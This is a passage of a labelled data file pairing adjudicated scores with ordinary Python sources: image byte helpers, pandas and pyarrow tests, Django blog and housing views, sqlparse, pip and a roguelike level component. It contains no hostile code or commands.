string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16be(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer, big endian.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from("">h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<i"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i16be(c, o=0):<<NEWL>>    return unpack_from("">H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32be(c, o=0):<<NEWL>>    return unpack_from("">I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>># Output, le = little endian, be = big endian<<NEWL>>def o16le(i):<<NEWL>>    return pack(""<H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32le(i):<<NEWL>>    return pack(""<I"", i)<<NEWL>><<NEWL>><<NEWL>>def o16be(i):<<NEWL>>    return pack("">H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32be(i):<<NEWL>>    return pack("">I"", i)"
72	adjudicated	4	"#<<NEWL>># Copyright 2018 the original author or authors.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#      http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>>#<<NEWL>>from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask<<NEWL>><<NEWL>><<NEWL>>class AdtnGetMdsTask(GetMdsTask):<<NEWL>>    """"""<<NEWL>>    OpenOMCI Get MIB Data Sync value task - Adtran ONU<<NEWL>><<NEWL>>    On successful completion, this task will call the 'callback' method of the<<NEWL>>    deferred returned by the start method and return the value of the MIB<<NEWL>>    Data Sync attribute of the ONT Data ME<<NEWL>>    """"""<<NEWL>>    name = ""ADTN: Get MDS Task""<<NEWL>><<NEWL>>    def __init__(self, omci_agent, device_id):<<NEWL>>        """"""<<NEWL>>        Class initialization<<NEWL>><<NEWL>>        :param omci_agent: (OmciAdapterAgent) OMCI Adapter agent<<NEWL>>        :param device_id: (str) ONU Device ID<<NEWL>>        """"""<<NEWL>>        super(AdtnGetMdsTask, self).__init__(omci_agent, device_id)<<NEWL>><<NEWL>>        self.name = AdtnGetMdsTask.name<<NEWL>>        self._device = omci_agent.get_device(device_id)<<NEWL>>        self._omci_managed = False      # TODO: Look up capabilities/model number/check handler<<NEWL>><<NEWL>>    def perform_get_mds(self):<<NEWL>>        """"""<<NEWL>>        Get the 'mib_data_sync' attribute of the ONU<<NEWL>>        """"""<<NEWL>>        self.log.info('perform-get-mds')<<NEWL>><<NEWL>>        if self._omci_managed:<<NEWL>>            return super(AdtnGetMdsTask, self).perform_get_mds()<<NEWL>><<NEWL>>        # Non-OMCI managed ADTN ONUs always return 0 for MDS, use the MIB<<NEWL>>        # sync value and depend on an accelerated mib resync to do the<<NEWL>>        # proper comparison<<NEWL>><<NEWL>>        self.deferred.callback(self._device.mib_synchronizer.mib_data_sync)<<NEWL>>"
132	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>import weakref<<NEWL>><<NEWL>>import numpy as np<<NEWL>><<NEWL>>import pyarrow as pa<<NEWL>>from pyarrow.lib import StringBuilder<<NEWL>><<NEWL>><<NEWL>>def test_weakref():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    wr = weakref.ref(sbuilder)<<NEWL>>    assert wr() is not None<<NEWL>>    del sbuilder<<NEWL>>    assert wr() is None<<NEWL>><<NEWL>><<NEWL>>def test_string_builder_append():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    sbuilder.append(b""a byte string"")<<NEWL>>    sbuilder.append(""a string"")<<NEWL>>    sbuilder.append(np.nan)<<NEWL>>    sbuilder.append(None)<<NEWL>>    assert len(sbuilder) == 4<<NEWL>>    assert sbuilder.null_count == 2<<NEWL>>    arr = sbuilder.finish()<<NEWL>>    assert len(sbuilder) == 0<<NEWL>>    assert isinstance(arr, pa.Array)<<NEWL>>    assert arr.null_count == 2<<NEWL>>    assert arr.type == 'str'<<NEWL>>    expected = [""a byte string"", ""a string"", None, None]<<NEWL>>    assert arr.to_pylist() == expected<<NEWL>><<NEWL>><<NEWL>>def test_string_builder_append_values():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])<<NEWL>>    assert sbuilder.null_count == 3<<NEWL>>    arr = sbuilder.finish()<<NEWL>>    assert arr.null_count == 3<<NEWL>>    expected = [None, None, ""text"", None, ""other text""]<<NEWL>>    assert arr.to_pylist() == expected<<NEWL>><<NEWL>><<NEWL>>def test_string_builder_append_after_finish():<<NEWL>>    sbuilder = StringBuilder()<<NEWL>>    sbuilder.append_values([np.nan, None, ""text"", None, ""other text""])<<NEWL>>    arr = sbuilder.finish()<<NEWL>>    sbuilder.append(""No effect"")<<NEWL>>    expected = [None, None, ""text"", None, ""other text""]<<NEWL>>    assert arr.to_pylist() == expected"
23	adjudicated	3	"#<<NEWL>># Copyright (C) 2009-2020 the sqlparse authors and contributors<<NEWL>># <see AUTHORS file><<NEWL>>#<<NEWL>># This module is part of python-sqlparse and is released under<<NEWL>># the BSD License: https://opensource.org/licenses/BSD-3-Clause<<NEWL>><<NEWL>>""""""Parse SQL statements.""""""<<NEWL>><<NEWL>># Setup namespace<<NEWL>>from sqlparse import sql<<NEWL>>from sqlparse import cli<<NEWL>>from sqlparse import engine<<NEWL>>from sqlparse import tokens<<NEWL>>from sqlparse import filters<<NEWL>>from sqlparse import formatter<<NEWL>><<NEWL>><<NEWL>>__version__ = '0.4.3'<<NEWL>>__all__ = ['engine', 'filters', 'formatter', 'sql', 'tokens', 'cli']<<NEWL>><<NEWL>><<NEWL>>def parse(sql, encoding=None):<<NEWL>>    """"""Parse sql and return a list of statements.<<NEWL>><<NEWL>>    :param sql: A string containing one or more SQL statements.<<NEWL>>    :param encoding: The encoding of the statement (optional).<<NEWL>>    :returns: A tuple of :class:`~sqlparse.sql.Statement` instances.<<NEWL>>    """"""<<NEWL>>    return tuple(parsestream(sql, encoding))<<NEWL>><<NEWL>><<NEWL>>def parsestream(stream, encoding=None):<<NEWL>>    """"""Parses sql statements from file-like object.<<NEWL>><<NEWL>>    :param stream: A file-like object.<<NEWL>>    :param encoding: The encoding of the stream contents (optional).<<NEWL>>    :returns: A generator of :class:`~sqlparse.sql.Statement` instances.<<NEWL>>    """"""<<NEWL>>    stack = engine.FilterStack()<<NEWL>>    stack.enable_grouping()<<NEWL>>    return stack.run(stream, encoding)<<NEWL>><<NEWL>><<NEWL>>def format(sql, encoding=None, **options):<<NEWL>>    """"""Format *sql* according to *options*.<<NEWL>><<NEWL>>    Available options are documented in :ref:`formatting`.<<NEWL>><<NEWL>>    In addition to the formatting options this function accepts the<<NEWL>>    keyword ""encoding"" which determines the encoding of the statement.<<NEWL>><<NEWL>>    :returns: The formatted SQL statement as string.<<NEWL>>    """"""<<NEWL>>    stack = engine.FilterStack()<<NEWL>>    options = formatter.validate_options(options)<<NEWL>>    stack = formatter.build_filter_stack(stack, options)<<NEWL>>    stack.postprocess.append(filters.SerializerUnicode())<<NEWL>>    return ''.join(stack.run(sql, encoding))<<NEWL>><<NEWL>><<NEWL>>def split(sql, encoding=None):<<NEWL>>    """"""Split *sql* into single statements.<<NEWL>><<NEWL>>    :param sql: A string containing one or more SQL statements.<<NEWL>>    :param encoding: The encoding of the statement (optional).<<NEWL>>    :returns: A list of strings.<<NEWL>>    """"""<<NEWL>>    stack = engine.FilterStack()<<NEWL>>    return [str(stmt).strip() for stmt in stack.run(sql, encoding)]"
163	adjudicated	0	"from __future__ import annotations<<NEWL>><<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>from components.base_component import BaseComponent<<NEWL>><<NEWL>>if TYPE_CHECKING:<<NEWL>>    from entity import Actor<<NEWL>><<NEWL>><<NEWL>>class Level(BaseComponent):<<NEWL>>    parent: Actor<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        current_level: int = 1,<<NEWL>>        current_xp: int = 0,<<NEWL>>        level_up_base: int = 0,<<NEWL>>        level_up_factor: int = 150,<<NEWL>>        xp_given: int = 0,<<NEWL>>    ):<<NEWL>>        self.current_level = current_level<<NEWL>>        self.current_xp = current_xp<<NEWL>>        self.level_up_base = level_up_base<<NEWL>>        self.level_up_factor = level_up_factor<<NEWL>>        self.xp_given = xp_given<<NEWL>><<NEWL>>    @property<<NEWL>>    def experience_to_next_level(self) -> int:<<NEWL>>        return self.level_up_base + self.current_level * self.level_up_factor<<NEWL>><<NEWL>>    @property<<NEWL>>    def requires_level_up(self) -> bool:<<NEWL>>        return self.current_xp > self.experience_to_next_level<<NEWL>><<NEWL>>    def add_xp(self, xp: int) -> None:<<NEWL>>        if xp == 0 or self.level_up_base == 0:<<NEWL>>            return<<NEWL>><<NEWL>>        self.current_xp += xp<<NEWL>><<NEWL>>        self.engine.message_log.add_message(f""You gain {xp} experience points."")<<NEWL>><<NEWL>>        if self.requires_level_up:<<NEWL>>            self.engine.message_log.add_message(<<NEWL>>                f""You advance to level {self.current_level + 1}!""<<NEWL>>            )<<NEWL>><<NEWL>>    def increase_level(self) -> None:<<NEWL>>        self.current_xp -= self.experience_to_next_level<<NEWL>><<NEWL>>        self.current_level += 1<<NEWL>><<NEWL>>    def increase_max_hp(self, amount: int = 20) -> None:<<NEWL>>        self.parent.fighter.max_hp += amount<<NEWL>>        self.parent.fighter.hp += amount<<NEWL>><<NEWL>>        self.engine.message_log.add_message(""Your health improves!"")<<NEWL>><<NEWL>>        self.increase_level()<<NEWL>><<NEWL>>    def increase_power(self, amount: int = 1) -> None:<<NEWL>>        self.parent.fighter.base_power += amount<<NEWL>><<NEWL>>        self.engine.message_log.add_message(""You feel stronger!"")<<NEWL>><<NEWL>>        self.increase_level()<<NEWL>><<NEWL>>    def increase_defense(self, amount: int = 1) -> None:<<NEWL>>        self.parent.fighter.base_defense += amount<<NEWL>><<NEWL>>        self.engine.message_log.add_message(""Your movements are getting swifter!"")<<NEWL>><<NEWL>>        self.increase_level()"
341	adjudicated	2	"from django.db import models<<NEWL>>from django.contrib.auth.models import User<<NEWL>>from io import BytesIO<<NEWL>>import sys<<NEWL>>print(sys.path)<<NEWL>>from PIL import Image<<NEWL>>from django.core.files.uploadedfile import InMemoryUploadedFile<<NEWL>><<NEWL>><<NEWL>># Create your models here.<<NEWL>><<NEWL>>class Blog_Post(models.Model, object):<<NEWL>>    image = models.ImageField(blank= True, upload_to='get_upload_file_name')<<NEWL>>    title = models.CharField(blank=True, max_length = 100)<<NEWL>>    summary = models.TextField(blank= True, max_length =30)<<NEWL>>    body = models.TextField(blank=True)<<NEWL>>    slug = models.SlugField( unique=True)<<NEWL>>    writer = models.ForeignKey(User,on_delete= models.CASCADE)<<NEWL>>    created_on = models.DateTimeField(auto_now_add=True)<<NEWL>><<NEWL>>    def __str__(self) -> str:<<NEWL>>        return self.title<<NEWL>>    def save(self):<<NEWL>>        # Opening the uploaded image<<NEWL>>        im = Image.open(self.image)<<NEWL>><<NEWL>>        output = BytesIO()<<NEWL>><<NEWL>>        # Resize/modify the image<<NEWL>>        im = im.resize((1024, 720))<<NEWL>><<NEWL>>        # after modifications, save it to the output<<NEWL>>        im.save(output, format='png', quality=300)<<NEWL>>        output.seek(0)<<NEWL>><<NEWL>>        # change the imagefield value to be the newley modifed image value<<NEWL>>        self.image = InMemoryUploadedFile(output, 'ImageField', ""%s.webp"" % self.image.name.split('.')[0], 'image/webp',<<NEWL>>                                        sys.getsizeof(output), None)<<NEWL>><<NEWL>>        super(Blog_Post, self).save()<<NEWL>><<NEWL>>class Comment(models.Model):<<NEWL>>        commenter = models.CharField(max_length=15)<<NEWL>>        body = models.TextField(max_length=30, blank=True)<<NEWL>>        post = models.ForeignKey(Blog_Post, on_delete=models.CASCADE, related_name='comments')<<NEWL>>        date = models.DateField(auto_now_add=True)<<NEWL>>        like = models.BooleanField(default=True)<<NEWL>>        def __str__(self) -> str:<<NEWL>>             return self.commenter<<NEWL>><<NEWL>><<NEWL>><<NEWL>>class Meta:<<NEWL>>    ordering = ('-created_at',)<<NEWL>><<NEWL>>   "
190	adjudicated	2	"import logging<<NEWL>><<NEWL>>""""""<<NEWL>>_logging.py<<NEWL>>websocket - WebSocket client library for Python<<NEWL>><<NEWL>>Copyright 2022 engn33r<<NEWL>><<NEWL>>Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>>you may not use this file except in compliance with the License.<<NEWL>>You may obtain a copy of the License at<<NEWL>><<NEWL>>    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>><<NEWL>>Unless required by applicable law or agreed to in writing, software<<NEWL>>distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>>WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>>See the License for the specific language governing permissions and<<NEWL>>limitations under the License.<<NEWL>>""""""<<NEWL>><<NEWL>>_logger = logging.getLogger('websocket')<<NEWL>>try:<<NEWL>>    from logging import NullHandler<<NEWL>>except ImportError:<<NEWL>>    class NullHandler(logging.Handler):<<NEWL>>        def emit(self, record):<<NEWL>>            pass<<NEWL>><<NEWL>>_logger.addHandler(NullHandler())<<NEWL>><<NEWL>>_traceEnabled = False<<NEWL>><<NEWL>>__all__ = [""enableTrace"", ""dump"", ""error"", ""warning"", ""debug"", ""trace"",<<NEWL>>           ""isEnabledForError"", ""isEnabledForDebug"", ""isEnabledForTrace""]<<NEWL>><<NEWL>><<NEWL>>def enableTrace(traceable, handler=logging.StreamHandler(), level=""DEBUG""):<<NEWL>>    """"""<<NEWL>>    Turn on/off the traceability.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    traceable: bool<<NEWL>>        If set to True, traceability is enabled.<<NEWL>>    """"""<<NEWL>>    global _traceEnabled<<NEWL>>    _traceEnabled = traceable<<NEWL>>    if traceable:<<NEWL>>        _logger.addHandler(handler)<<NEWL>>        _logger.setLevel(getattr(logging, level))<<NEWL>><<NEWL>><<NEWL>>def dump(title, message):<<NEWL>>    if _traceEnabled:<<NEWL>>        _logger.debug(""--- "" + title + "" ---"")<<NEWL>>        _logger.debug(message)<<NEWL>>        _logger.debug(""-----------------------"")<<NEWL>><<NEWL>><<NEWL>>def error(msg):<<NEWL>>    _logger.error(msg)<<NEWL>><<NEWL>><<NEWL>>def warning(msg):<<NEWL>>    _logger.warning(msg)<<NEWL>><<NEWL>><<NEWL>>def debug(msg):<<NEWL>>    _logger.debug(msg)<<NEWL>><<NEWL>><<NEWL>>def info(msg):<<NEWL>>    _logger.info(msg)<<NEWL>><<NEWL>><<NEWL>>def trace(msg):<<NEWL>>    if _traceEnabled:<<NEWL>>        _logger.debug(msg)<<NEWL>><<NEWL>><<NEWL>>def isEnabledForError():<<NEWL>>    return _logger.isEnabledFor(logging.ERROR)<<NEWL>><<NEWL>><<NEWL>>def isEnabledForDebug():<<NEWL>>    return _logger.isEnabledFor(logging.DEBUG)<<NEWL>><<NEWL>><<NEWL>>def isEnabledForTrace():<<NEWL>>    return _traceEnabled"
201	adjudicated	1	"import re<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>>from pandas.io.excel import ExcelWriter<<NEWL>><<NEWL>>odf = pytest.importorskip(""odf"")<<NEWL>><<NEWL>>pytestmark = pytest.mark.parametrize(""ext"", ["".ods""])<<NEWL>><<NEWL>><<NEWL>>def test_write_append_mode_raises(ext):<<NEWL>>    msg = ""Append mode is not supported with odf!""<<NEWL>><<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        with pytest.raises(ValueError, match=msg):<<NEWL>>            ExcelWriter(f, engine=""odf"", mode=""a"")<<NEWL>><<NEWL>><<NEWL>>def test_kwargs(ext):<<NEWL>>    # GH 42286<<NEWL>>    # GH 43445<<NEWL>>    # test for error: OpenDocumentSpreadsheet does not accept any arguments<<NEWL>>    kwargs = {""kwarg"": 1}<<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        msg = re.escape(""Use of **kwargs is deprecated"")<<NEWL>>        error = re.escape(<<NEWL>>            ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""<<NEWL>>        )<<NEWL>>        with pytest.raises(<<NEWL>>            TypeError,<<NEWL>>            match=error,<<NEWL>>        ):<<NEWL>>            with tm.assert_produces_warning(FutureWarning, match=msg):<<NEWL>>                with ExcelWriter(f, engine=""odf"", **kwargs) as _:<<NEWL>>                    pass<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(""engine_kwargs"", [None, {""kwarg"": 1}])<<NEWL>>def test_engine_kwargs(ext, engine_kwargs):<<NEWL>>    # GH 42286<<NEWL>>    # GH 43445<<NEWL>>    # test for error: OpenDocumentSpreadsheet does not accept any arguments<<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        if engine_kwargs is not None:<<NEWL>>            error = re.escape(<<NEWL>>                ""OpenDocumentSpreadsheet() got an unexpected keyword argument 'kwarg'""<<NEWL>>            )<<NEWL>>            with pytest.raises(<<NEWL>>                TypeError,<<NEWL>>                match=error,<<NEWL>>            ):<<NEWL>>                ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs)<<NEWL>>        else:<<NEWL>>            with ExcelWriter(f, engine=""odf"", engine_kwargs=engine_kwargs) as _:<<NEWL>>                pass<<NEWL>><<NEWL>><<NEWL>>def test_book_and_sheets_consistent(ext):<<NEWL>>    # GH#45687 - Ensure sheets is updated if user modifies book<<NEWL>>    with tm.ensure_clean(ext) as f:<<NEWL>>        with ExcelWriter(f) as writer:<<NEWL>>            assert writer.sheets == {}<<NEWL>>            table = odf.table.Table(name=""test_name"")<<NEWL>>            writer.book.spreadsheet.addElement(table)<<NEWL>>            assert writer.sheets == {""test_name"": table}"
81	adjudicated	0	"from django.contrib.messages.views import SuccessMessageMixin<<NEWL>>from django.views.generic import CreateView, ListView, UpdateView, DeleteView<<NEWL>>from django.urls import reverse_lazy<<NEWL>>from .forms import HouseForm<<NEWL>>from .mixins import CountFlatsMixin, ImageResizeBeforeMixin<<NEWL>>from .models import House<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>>from ..mixins import LoginRequiredMixinCustom<<NEWL>><<NEWL>><<NEWL>>class HouseCreateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,<<NEWL>>                      SuccessMessageMixin, CreateView):<<NEWL>>    form_class = HouseForm<<NEWL>>    template_name = ""house/create.html""<<NEWL>>    success_url = reverse_lazy('house_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Create house'),<<NEWL>>        'button_title': _('Create'),<<NEWL>>        'langs': House.get_lang_list_qs(),<<NEWL>>    }<<NEWL>>    success_message = _('House created successfully')<<NEWL>><<NEWL>><<NEWL>>class HouseUpdateView(LoginRequiredMixinCustom, ImageResizeBeforeMixin,<<NEWL>>                      SuccessMessageMixin, UpdateView):<<NEWL>>    model = House<<NEWL>>    form_class = HouseForm<<NEWL>>    template_name = ""house/create.html""<<NEWL>>    success_url = reverse_lazy('house_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Update house'),<<NEWL>>        'button_title': _('Update'),<<NEWL>>        'langs': House.get_lang_list_qs(),<<NEWL>>    }<<NEWL>>    success_message = _('House updated successfully')<<NEWL>><<NEWL>><<NEWL>>class HouseListView(LoginRequiredMixinCustom, CountFlatsMixin, ListView):<<NEWL>>    model = House<<NEWL>>    template_name = ""house/list.html""<<NEWL>>    extra_context = {<<NEWL>>        'remove_title': _('remove'),<<NEWL>>    }<<NEWL>>    ordering = 'address'<<NEWL>><<NEWL>><<NEWL>>class HouseDeleteView(LoginRequiredMixinCustom,<<NEWL>>                      SuccessMessageMixin, DeleteView):<<NEWL>>    model = House<<NEWL>>    template_name = ""house/delete.html""<<NEWL>>    success_url = reverse_lazy('house_list')<<NEWL>>    extra_context = {<<NEWL>>        'header': _('Remove house'),<<NEWL>>        'button_title': _('Remove '),<<NEWL>>        'message': _('Are you sure delete house '),<<NEWL>>    }<<NEWL>>    success_message = _('House deleted successfully')"
310	adjudicated	1	"from datetime import datetime<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas._libs import tslib<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(<<NEWL>>    ""date_str, exp"",<<NEWL>>    [<<NEWL>>        (""2011-01-02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011-1-2"", datetime(2011, 1, 2)),<<NEWL>>        (""2011-01"", datetime(2011, 1, 1)),<<NEWL>>        (""2011-1"", datetime(2011, 1, 1)),<<NEWL>>        (""2011 01 02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011.01.02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011/01/02"", datetime(2011, 1, 2)),<<NEWL>>        (""2011\\01\\02"", datetime(2011, 1, 2)),<<NEWL>>        (""2013-01-01 05:30:00"", datetime(2013, 1, 1, 5, 30)),<<NEWL>>        (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30)),<<NEWL>>    ],<<NEWL>>)<<NEWL>>def test_parsers_iso8601(date_str, exp):<<NEWL>>    # see gh-12060<<NEWL>>    #<<NEWL>>    # Test only the ISO parser - flexibility to<<NEWL>>    # different separators and leading zero's.<<NEWL>>    actual = tslib._test_parse_iso8601(date_str)<<NEWL>>    assert actual == exp<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(<<NEWL>>    ""date_str"",<<NEWL>>    [<<NEWL>>        ""2011-01/02"",<<NEWL>>        ""2011=11=11"",<<NEWL>>        ""201401"",<<NEWL>>        ""201111"",<<NEWL>>        ""200101"",<<NEWL>>        # Mixed separated and unseparated.<<NEWL>>        ""2005-0101"",<<NEWL>>        ""200501-01"",<<NEWL>>        ""20010101 12:3456"",<<NEWL>>        ""20010101 1234:56"",<<NEWL>>        # HHMMSS must have two digits in<<NEWL>>        # each component if unseparated.<<NEWL>>        ""20010101 1"",<<NEWL>>        ""20010101 123"",<<NEWL>>        ""20010101 12345"",<<NEWL>>        ""20010101 12345Z"",<<NEWL>>    ],<<NEWL>>)<<NEWL>>def test_parsers_iso8601_invalid(date_str):<<NEWL>>    msg = f'Error parsing datetime string ""{date_str}""'<<NEWL>><<NEWL>>    with pytest.raises(ValueError, match=msg):<<NEWL>>        tslib._test_parse_iso8601(date_str)<<NEWL>><<NEWL>><<NEWL>>def test_parsers_iso8601_invalid_offset_invalid():<<NEWL>>    date_str = ""2001-01-01 12-34-56""<<NEWL>>    msg = f'Timezone hours offset out of range in datetime string ""{date_str}""'<<NEWL>><<NEWL>>    with pytest.raises(ValueError, match=msg):<<NEWL>>        tslib._test_parse_iso8601(date_str)<<NEWL>><<NEWL>><<NEWL>>def test_parsers_iso8601_leading_space():<<NEWL>>    # GH#25895 make sure isoparser doesn't overflow with long input<<NEWL>>    date_str, expected = (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30))<<NEWL>>    actual = tslib._test_parse_iso8601("" "" * 200 + date_str)<<NEWL>>    assert actual == expected"
250	adjudicated	0	"""""""Text field.""""""<<NEWL>><<NEWL>>import gws<<NEWL>>import gws.base.database.sql as sql<<NEWL>>import gws.base.database.model<<NEWL>>import gws.types as t<<NEWL>><<NEWL>>from .. import scalar<<NEWL>><<NEWL>>gws.ext.new.modelField('text')<<NEWL>><<NEWL>><<NEWL>>class SearchType(t.Enum):<<NEWL>>    exact = 'exact'<<NEWL>>    begin = 'begin'<<NEWL>>    end = 'end'<<NEWL>>    any = 'any'<<NEWL>>    like = 'like'<<NEWL>><<NEWL>><<NEWL>>class Search(gws.Data):<<NEWL>>    type: SearchType<<NEWL>>    minLength: int<<NEWL>>    caseSensitive: bool<<NEWL>><<NEWL>><<NEWL>>class SearchConfig(gws.Config):<<NEWL>>    type: SearchType<<NEWL>>    minLength: int = 0<<NEWL>>    caseSensitive: bool = False<<NEWL>><<NEWL>><<NEWL>>class Config(scalar.Config):<<NEWL>>    textSearch: t.Optional[SearchConfig]<<NEWL>><<NEWL>><<NEWL>>class Props(scalar.Props):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class Object(scalar.Object):<<NEWL>>    attributeType = gws.AttributeType.str<<NEWL>>    textSearch: t.Optional[Search]<<NEWL>><<NEWL>>    def configure(self):<<NEWL>>        self.textSearch = None<<NEWL>>        p = self.var('textSearch')<<NEWL>>        if p:<<NEWL>>            self.textSearch = Search(<<NEWL>>                type=p.get('type', SearchType.exact),<<NEWL>>                minLength=p.get('minLength', 0),<<NEWL>>                caseSensitive=p.get('caseSensitive', False),<<NEWL>>            )<<NEWL>><<NEWL>>    def sa_select(self, sel, user):<<NEWL>>        sel = t.cast(sql.SelectStatement, sel)<<NEWL>><<NEWL>>        if not self.textSearch or not sel.search or not sel.search.keyword:<<NEWL>>            return<<NEWL>><<NEWL>>        kw = sel.search.keyword<<NEWL>>        so = self.textSearch<<NEWL>>        if so.minLength and len(kw) < so.minLength:<<NEWL>>            return<<NEWL>><<NEWL>>        mod = t.cast(gws.base.database.model.Object, self.model)<<NEWL>>        fld = sql.sa.sql.cast(<<NEWL>>            getattr(mod.sa_class(), self.name),<<NEWL>>            sql.sa.String)<<NEWL>><<NEWL>>        if so.type == SearchType.exact:<<NEWL>>            sel.keywordWhere.append(fld == kw)<<NEWL>>        else:<<NEWL>>            kw = sql.escape_like(kw)<<NEWL>>            if so.type == 'any':<<NEWL>>                kw = '%' + kw + '%'<<NEWL>>            if so.type == 'begin':<<NEWL>>                kw = kw + '%'<<NEWL>>            if so.type == 'end':<<NEWL>>                kw = '%' + kw<<NEWL>><<NEWL>>            if so.caseSensitive:<<NEWL>>                sel.keywordWhere.append(fld.like(kw, escape='\\'))<<NEWL>>            else:<<NEWL>>                sel.keywordWhere.append(fld.ilike(kw, escape='\\'))"
471	adjudicated	2	"""""""Metadata generation logic for legacy source distributions.<<NEWL>>""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import os<<NEWL>><<NEWL>>from pip._internal.build_env import BuildEnvironment<<NEWL>>from pip._internal.exceptions import InstallationError<<NEWL>>from pip._internal.utils.setuptools_build import make_setuptools_egg_info_args<<NEWL>>from pip._internal.utils.subprocess import call_subprocess<<NEWL>>from pip._internal.utils.temp_dir import TempDirectory<<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>def _find_egg_info(directory):<<NEWL>>    # type: (str) -> str<<NEWL>>    """"""Find an .egg-info subdirectory in `directory`.<<NEWL>>    """"""<<NEWL>>    filenames = [<<NEWL>>        f for f in os.listdir(directory) if f.endswith("".egg-info"")<<NEWL>>    ]<<NEWL>><<NEWL>>    if not filenames:<<NEWL>>        raise InstallationError(<<NEWL>>            f""No .egg-info directory found in {directory}""<<NEWL>>        )<<NEWL>><<NEWL>>    if len(filenames) > 1:<<NEWL>>        raise InstallationError(<<NEWL>>            ""More than one .egg-info directory found in {}"".format(<<NEWL>>                directory<<NEWL>>            )<<NEWL>>        )<<NEWL>><<NEWL>>    return os.path.join(directory, filenames[0])<<NEWL>><<NEWL>><<NEWL>>def generate_metadata(<<NEWL>>    build_env,  # type: BuildEnvironment<<NEWL>>    setup_py_path,  # type: str<<NEWL>>    source_dir,  # type: str<<NEWL>>    isolated,  # type: bool<<NEWL>>    details,  # type: str<<NEWL>>):<<NEWL>>    # type: (...) -> str<<NEWL>>    """"""Generate metadata using setup.py-based defacto mechanisms.<<NEWL>><<NEWL>>    Returns the generated metadata directory.<<NEWL>>    """"""<<NEWL>>    logger.debug(<<NEWL>>        'Running setup.py (path:%s) egg_info for package %s',<<NEWL>>        setup_py_path, details,<<NEWL>>    )<<NEWL>><<NEWL>>    egg_info_dir = TempDirectory(<<NEWL>>        